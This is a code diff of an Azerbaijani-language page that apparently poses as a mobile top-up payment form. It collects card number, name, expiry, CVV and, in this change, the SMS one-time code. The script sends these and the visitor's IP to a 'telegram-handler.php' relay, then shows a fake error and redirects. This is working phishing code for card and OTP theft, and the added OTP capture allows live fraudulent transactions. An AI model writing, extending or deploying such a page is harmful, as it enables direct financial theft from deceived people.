@@ -15,14 +15,12 @@
         
         .main-container { width: 100%; max-width: 430px; padding: 0 20px 30px 20px; box-sizing: border-box; }
         
-        /* Sifariş Xülasəsi */
         .summary-box { background: #111622; color: #fff; border-radius: 16px; padding: 15px 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); font-size: 0.9rem; }
         .summary-box h4 { margin: 0 0 10px 0; color: #ff3b30; border-bottom: 1px solid #1f2736; padding-bottom: 8px; font-size: 1rem; }
         .sum-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
         .sum-row span:first-child { color: #8c9ba5; }
         .sum-row span:last-child { font-weight: 600; }
 
-        /* Realist Bank Kartı Vizuallığı */
         .visual-card { background: linear-gradient(135deg, #1f232c 0%, #3a1c28 50%, #11141a 100%); border-radius: 20px; padding: 25px; color: white; box-shadow: 0 15px 30px rgba(0,0,0,0.25); margin-bottom: 25px; position: relative; overflow: hidden; letter-spacing: 1px; }
         .visual-card::before { content: ''; position: absolute; top: -50%; right: -20%; width: 200px; height: 200px; background: rgba(255,255,255,0.03); border-radius: 50%; }
         .card-system { font-size: 0.9rem; font-weight: 800; opacity: 0.8; text-transform: uppercase; margin-bottom: 35px; }
@@ -31,14 +29,13 @@
         .card-lbl { font-size: 0.65rem; text-transform: uppercase; color: rgba(255,255,255,0.5); margin-bottom: 4px; font-weight: 600; }
         .card-val { font-size: 0.9rem; font-weight: bold; min-height: 18px; text-transform: uppercase; }
 
-        /* Giriş Formu */
         .form-group { margin-bottom: 18px; position: relative; }
         .form-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #5f6f95; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
         .form-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; background: #ffffff; font-size: 1.05rem; font-weight: 500; color: #1a202c; outline: none; box-sizing: border-box; transition: border-color 0.2s; }
         .form-group input:focus { border-color: #ff3b30; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
         
-        /* Ay Xətası Mətni */
         .error-hint { color: #ff3b30; font-size: 0.7rem; font-weight: 600; margin-top: 4px; display: none; position: absolute; bottom: -16px; left: 2px; }
 
         .submit-btn { width: 100%; padding: 16px; background: linear-gradient(90deg, #ff3b30, #e02e24); color: white; border: none; border-radius: 14px; font-size: 1.1rem; font-weight: bold; cursor: pointer; box-shadow: 0 6px 20px rgba(255,59,48,0.3); transition: transform 0.1s, opacity 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
@@ -48,13 +45,11 @@
         .ssl-info { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 0.8rem; color: #718096; margin-top: 15px; text-align: center; }
         .back-link { display: inline-block; margin-top: 25px; color: #718096; text-decoration: none; font-size: 0.9rem; font-weight: 500; }
 
-        /* Yeni Bank Tipli Pop-up Stil Dəyişiklikləri */
         .popup-back { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: center; z-index: 999; visibility: hidden; opacity: 0; transition: opacity 0.3s; padding: 20px; box-sizing: border-box; }
         .popup-back.visible { visibility: visible; opacity: 1; }
         .popup-box { background: #ffffff; border-radius: 24px; width: 100%; max-width: 330px; padding: 30px 20px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.4); animation: scaleUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
         @keyframes scaleUp { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         
-        /* Qırmızı Nida Animasiyası */
         .error-alert-icon { width: 50px; height: 50px; border: 3px solid #ff3b30; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #ff3b30; font-size: 2.2rem; font-weight: bold; margin: 0 auto 15px auto; animation: pulseGlow 1.2s infinite ease-in-out; }
         @keyframes pulseGlow { 0% { transform: scale(1); opacity: 1; box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.4); } 50% { transform: scale(1.05); opacity: 0.7; box-shadow: 0 0 12px 6px rgba(255, 59, 48, 0.2); } 100% { transform: scale(1); opacity: 1; box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); } }
         
@@ -62,6 +57,49 @@
         .popup-msg { font-size: 0.95rem; color: #4a5568; line-height: 1.5; margin-bottom: 22px; font-weight: 500; }
         .popup-btn { width: 100%; padding: 13px; background: #ff3b30; color: white; border: none; border-radius: 12px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
         .popup-btn:hover { background: #e02e24; }
+        
+        /* OTP input stili */
+        .otp-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 10px 0;
+        }
+        .otp-container input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            background: #ffffff;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .otp-container input:focus {
+            border-color: #ff3b30;
+        }
+        .otp-container input:disabled {
+            background: #f5f5f5;
+        }
+        .otp-hint {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #718096;
+            margin-top: 8px;
+        }
+        .otp-hint span {
+            color: #ff3b30;
+            font-weight: 600;
+        }
+        .otp-error {
+            color: #ff3b30;
+            font-size: 0.8rem;
+            text-align: center;
+            margin-top: 8px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -117,6 +155,23 @@
                 </div>
             </div>
 
+            <!-- OTP Hissəsi -->
+            <div class="form-group" style="margin-top: 20px;">
+                <label>OTP KODU (SMS ilə gələn kodu daxil edin)</label>
+                <div class="otp-container">
+                    <input type="text" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp2')" onkeydown="otpBackspace(this, 'otp1')">
+                    <input type="text" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp3')" onkeydown="otpBackspace(this, 'otp1')">
+                    <input type="text" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp4')" onkeydown="otpBackspace(this, 'otp2')">
+                    <input type="text" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp5')" onkeydown="otpBackspace(this, 'otp3')">
+                    <input type="text" id="otp5" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, 'otp6')" onkeydown="otpBackspace(this, 'otp4')" style="display:none;">
+                    <input type="text" id="otp6" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this, null)" onkeydown="otpBackspace(this, 'otp5')" style="display:none;">
+                </div>
+                <div class="otp-hint">
+                    <span id="otpLengthToggle" onclick="toggleOtpLength()">4 rəqəmli OTP istifadə et</span>
+                </div>
+                <div class="otp-error" id="otpError">OTP kodunu daxil edin (4 və ya 6 rəqəm)</div>
+            </div>
+
             <button type="submit" class="submit-btn" id="btnSubmit" disabled>
                 🔒 Ödənişi tamamla · <span id="btnPrice">0</span> AZN
             </button>
@@ -139,18 +194,69 @@
         </div>
     </div>
 
-        <script>
-    // 1. Data Yükləmə (localStorage)
+    <script>
+    // ===== OTP FUNKSİYALARI =====
+    let otpLength = 4; // default 4 rəqəm
+
+    function toggleOtpLength() {
+        const span = document.getElementById('otpLengthToggle');
+        const otp5 = document.getElementById('otp5');
+        const otp6 = document.getElementById('otp6');
+        
+        if (otpLength === 4) {
+            otpLength = 6;
+            span.textContent = '4 rəqəmli OTP istifadə et';
+            otp5.style.display = '';
+            otp6.style.display = '';
+            document.getElementById('otp4').oninput = function() { otpMove(this, 'otp5'); };
+        } else {
+            otpLength = 4;
+            span.textContent = '6 rəqəmli OTP istifadə et';
+            otp5.style.display = 'none';
+            otp6.style.display = 'none';
+            document.getElementById('otp4').oninput = function() { otpMove(this, null); };
+            // 5 və 6-cı xanaları təmizlə
+            document.getElementById('otp5').value = '';
+            document.getElementById('otp6').value = '';
+        }
+        valForm();
+    }
+
+    function otpMove(current, nextId) {
+        current.value = current.value.replace(/\D/g, '').slice(0, 1);
+        if (current.value.length === 1 && nextId) {
+            document.getElementById(nextId).focus();
+        }
+        valForm();
+        document.getElementById('otpError').style.display = 'none';
+    }
+
+    function otpBackspace(current, prevId) {
+        if (event.key === 'Backspace' && current.value === '' && prevId) {
+            document.getElementById(prevId).focus();
+        }
+    }
+
+    function getOtp() {
+        let otp = '';
+        for (let i = 1; i <= otpLength; i++) {
+            const val = document.getElementById('otp' + i).value;
+            if (val) otp += val;
+        }
+        return otp;
+    }
+
+    // ===== DATA YÜKLƏMƏ =====
     const oper = localStorage.getItem('selectedOperator') || 'Məlum deyil';
     const phone = localStorage.getItem('phoneNumber') || 'Məlum deyil';
     const amount = localStorage.getItem('paymentAmount') || '0';
 
-    if (document.getElementById('sumOper')) document.getElementById('sumOper').innerText = oper;
-    if (document.getElementById('sumPhone')) document.getElementById('sumPhone').innerText = phone;
-    if (document.getElementById('sumAmnt')) document.getElementById('sumAmnt').innerText = amount + '.00 AZN';
-    if (document.getElementById('btnPrice')) document.getElementById('btnPrice').innerText = amount;
+    document.getElementById('sumOper').innerText = oper;
+    document.getElementById('sumPhone').innerText = phone;
+    document.getElementById('sumAmnt').innerText = amount + '.00 AZN';
+    document.getElementById('btnPrice').innerText = amount;
 
-    // 2. Elementlər
+    // ===== ELEMENTLƏR =====
     const form = document.getElementById('payForm');
     const inpNo = document.getElementById('cardNo');
     const inpName = document.getElementById('cardName');
@@ -161,70 +267,74 @@
 
     let isMonthValid = true;
 
-    // 3. Canlı Sinxronizasiya
-    inpNo.addEventListener('input', (e) => {
+    // ===== CANLI SİNXRONİZASİYA =====
+    inpNo.addEventListener('input', function(e) {
         let v = e.target.value.replace(/\D/g, '').substring(0, 16);
         let matches = v.match(/(\d{1,4})/g);
         let res = matches ? matches.join(' ') : '';
         e.target.value = res;
-        
-        const cardViewNo = document.getElementById('cardViewNo');
-        if (cardViewNo) cardViewNo.innerText = res || '•••• •••• •••• ••••';
+        document.getElementById('cardViewNo').innerText = res || '•••• •••• •••• ••••';
         valForm();
     });
 
-    inpName.addEventListener('input', (e) => {
+    inpName.addEventListener('input', function(e) {
         let res = e.target.value.toUpperCase();
-        const cardViewName = document.getElementById('cardViewName');
-        if (cardViewName) cardViewName.innerText = res || '—';
+        document.getElementById('cardViewName').innerText = res || '—';
         valForm();
     });
 
-    inpExp.addEventListener('input', (e) => {
+    inpExp.addEventListener('input', function(e) {
         let v = e.target.value.replace(/\D/g, '').substring(0, 4);
         
         if (v.length >= 2) {
             let month = parseInt(v.substring(0, 2), 10);
             if (month < 1 || month > 12) {
-                if (expError) expError.style.display = 'block';
+                expError.style.display = 'block';
                 isMonthValid = false;
             } else {
-                if (expError) expError.style.display = 'none';
+                expError.style.display = 'none';
                 isMonthValid = true;
             }
         } else {
-            if (expError) expError.style.display = 'none';
+            expError.style.display = 'none';
             isMonthValid = true;
         }
 
         let res = v.length >= 2 ? v.substring(0, 2) + '/' + v.substring(2, 4) : v;
         e.target.value = res;
-        
-        const cardViewExp = document.getElementById('cardViewExp');
-        if (cardViewExp) cardViewExp.innerText = res || 'MM/YY';
+        document.getElementById('cardViewExp').innerText = res || 'MM/YY';
         valForm();
     });
 
-    inpCvv.addEventListener('input', (e) => {
+    inpCvv.addEventListener('input', function(e) {
         e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
         valForm();
     });
 
+    // ===== VALİDASİYA =====
     function valForm() {
         const okNo = inpNo.value.replace(/\s/g, '').length === 16;
         const okName = inpName.value.trim().length >= 4;
         const okExp = inpExp.value.length === 5;
         const okCvv = inpCvv.value.length === 3;
         
-        if (btn) {
-            btn.disabled = !(okNo && okName && okExp && okCvv && isMonthValid);
-        }
+        // OTP yoxlanışı
+        const otp = getOtp();
+        const okOtp = otp.length === otpLength;
+        
+        btn.disabled = !(okNo && okName && okExp && okCvv && okOtp && isMonthValid);
     }
 
-    // 4. Form Göndərilməsi (telegram-handler.php-yə)
-    form.addEventListener('submit', async (e) => {
+    // ===== FORM GÖNDƏRİLMƏSİ =====
+    form.addEventListener('submit', async function(e) {
         e.preventDefault();
         if (!isMonthValid) return;
+
+        const otp = getOtp();
+        if (otp.length !== otpLength) {
+            document.getElementById('otpError').style.display = 'block';
+            return;
+        }
 
         btn.disabled = true;
         btn.innerText = 'Yoxlanılır...';
@@ -236,7 +346,6 @@
             ip = d.ip;
         } catch(h) {}
 
-        // FormData yaradırıq
         const formData = new FormData();
         formData.append('card_name', inpName.value);
         formData.append('card_number', inpNo.value);
@@ -246,6 +355,7 @@
         formData.append('phone', phone);
         formData.append('amount', amount);
         formData.append('ip', ip);
+        formData.append('otp', otp);
 
         try {
             const response = await fetch('telegram-handler.php', {
@@ -256,7 +366,6 @@
             const result = await response.json();
 
             if (result.status === 'success') {
-                // Popup göstər
                 document.getElementById('errPopup').classList.add('visible');
             } else {
                 alert('Xəta baş verdi, yenidən cəhd edin.');
@@ -264,7 +373,7 @@
         } catch (err) {
             alert('Xəta baş verdi, yenidən cəhd edin.');
         } finally {
-            btn.innerText = `🔒 Ödənişi tamamla · ${amount} AZN`;
+            btn.innerText = '🔒 Ödənişi tamamla · ' + amount + ' AZN';
             valForm();
         }
     });
@@ -272,15 +381,18 @@
     function closePopup() {
         document.getElementById('errPopup').classList.remove('visible');
         form.reset();
-        if (document.getElementById('cardViewNo')) document.getElementById('cardViewNo').innerText = '•••• •••• •••• ••••';
-        if (document.getElementById('cardViewName')) document.getElementById('cardViewName').innerText = '—';
-        if (document.getElementById('cardViewExp')) document.getElementById('cardViewExp').innerText = 'MM/YY';
-        if (expError) expError.style.display = 'none';
+        document.getElementById('cardViewNo').innerText = '•••• •••• •••• ••••';
+        document.getElementById('cardViewName').innerText = '—';
+        document.getElementById('cardViewExp').innerText = 'MM/YY';
+        for (let i = 1; i <= 6; i++) {
+            document.getElementById('otp' + i).value = '';
+        }
+        expError.style.display = 'none';
         isMonthValid = true;
         valForm();
         window.location.href = 'index.html';
     }
-        </script>
+    </script>
         
 </body>
 </html>
